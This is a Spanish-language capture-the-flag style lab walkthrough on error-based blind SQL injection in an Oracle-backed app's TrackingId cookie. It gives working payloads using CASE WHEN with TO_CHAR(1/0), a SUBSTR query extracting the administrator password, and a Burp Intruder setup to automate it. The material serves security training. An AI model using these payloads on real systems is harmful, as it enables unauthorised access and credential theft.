## 📄 Descripción del laboratorio

Este laboratorio contiene una **inyección SQL ciega basada en errores**.\
La aplicación utiliza una cookie llamada `TrackingId` para realizar análisis internos, y ese valor se inserta directamente en una consulta SQL.

En este caso:

* Los resultados de la consulta **no se devuelven en la respuesta**.
* La página **no cambia** cuando la consulta devuelve filas.
* La respuesta **sí cambia cuando la consulta produce un error SQL**.

El objetivo es utilizar este comportamiento para extraer la contraseña del usuario **administrator** y autenticarnos con ella.



## 📚 Teoría

### 📌 Blind SQL Injection basada en errores

En este escenario seguimos trabajando con **Blind SQL Injection**, pero el canal lateral no se basa en contenido reflejado ni en diferencias visibles de la página.

El comportamiento observable es distinto:

* Si la consulta SQL se ejecuta correctamente → respuesta normal.
* Si la consulta provoca un error → aparece un **error 500** u otro error del servidor.

Esto permite utilizar el error como un **oráculo booleano**.

### 📌 Generación de errores en Oracle

En bases de datos **Oracle**, una división por cero genera un error fatal:

```
1/0
```

Podemos aprovechar esto dentro de una expresión condicional usando `CASE WHEN`.

Ejemplo conceptual:

```
CASE 
  WHEN (condición)
  THEN TO_CHAR(1/0)
  ELSE NULL
END
```

Funcionamiento:

* Si la condición es **TRUE**, se ejecuta `1/0` → error.
* Si la condición es **FALSE**, se devuelve `NULL` → no hay error.

Esto permite comprobar condiciones booleanas como:

* existencia de usuarios
* longitud de contraseñas
* caracteres específicos de un valor

Todo ello sin ver directamente los datos.



## 📝 Práctica

### 1️⃣ Confirmar la inyección SQL

Interceptamos una petición HTTP y localizamos la cookie vulnerable:

```
TrackingId=abc123
```

Probamos dos condiciones básicas para comprobar el comportamiento.



### 2️⃣ Probar una condición falsa (sin error)

Payload:

```
'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)+IS+NULL--
```

<br>

Resultado:

La página se carga normalmente.

Interpretación:

La condición `1=2` es falsa, por lo que no se ejecuta `1/0`.



### 3️⃣ Probar una condición verdadera (error)

Payload:

```
'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)+IS+NULL--
```

<img width="1520" height="442" alt="image" src="https://github.com/user-attachments/assets/57ed4d82-4e46-4806-9ca9-f1e95f484693" />
<br>

Resultado:

La aplicación devuelve **error 500** o un mensaje similar a _Internal Server Error_.

Esto confirma que existe una **Blind SQL Injection basada en errores**.



### 4️⃣ Extraer la contraseña carácter por carácter

Sabemos que existe la tabla:

```
users(username, password)
```

Podemos comprobar caracteres específicos usando `SUBSTR`.

Payload para comprobar el primer carácter:

```
'+AND+(SELECT+CASE+
WHEN+SUBSTR(
    (SELECT+password+FROM+users+WHERE+username='administrator'),
    1,1
)='a'
THEN+TO_CHAR(1/0)
ELSE+NULL
END+FROM+dual)+IS+NULL--
```

Interpretación:

* Si el primer carácter es **a**, se produce un error.
* Si no lo es, la respuesta es normal.

Repitiendo el proceso se puede descubrir cada carácter de la contraseña.



### 5️⃣ Automatizar con Burp Intruder

Para automatizar el proceso usamos **Burp Intruder**.

Payload base:

```
TrackingId=abc123' AND (
  SELECT CASE
    WHEN SUBSTR(
      (SELECT password FROM users WHERE username='administrator'),
      §1§,1
    )='§2§'
    THEN TO_CHAR(1/0)
    ELSE NULL
  END
  FROM dual
) IS NULL--
```

Configuración de payloads:

**Payload 1 — posición del carácter**

```
1–25
```

**Payload 2 — posibles caracteres**

```
a-z
A-Z
0-9
símbolos si es necesario
```

Indicador de éxito:

* código HTTP **500**
* mensaje **Internal Server Error**
* longitud de respuesta diferente

Cuando aparece el error, significa que el carácter probado es correcto.

### 6️⃣ Reconstruir la contraseña

Tras completar el ataque con Intruder, obtenemos la contraseña completa carácter por carácter.

Ejemplo conceptual:

```
j4k3r0ck5!
```

El valor exacto depende de la instancia del laboratorio.



### 7️⃣ Iniciar sesión como administrator

Accedemos al formulario de login e introducimos:

```
Username: administrator
Password: contraseña obtenida
```

La autenticación se realiza correctamente.

### 8️⃣ Resultado

Mediante una **Blind SQL Injection basada en errores** se ha conseguido:

* Confirmar la vulnerabilidad en la cookie `TrackingId`.
* Utilizar errores condicionales como canal de exfiltración.
* Extraer la contraseña del usuario **administrator** carácter por carácter.
* Autenticarse como **administrator**.
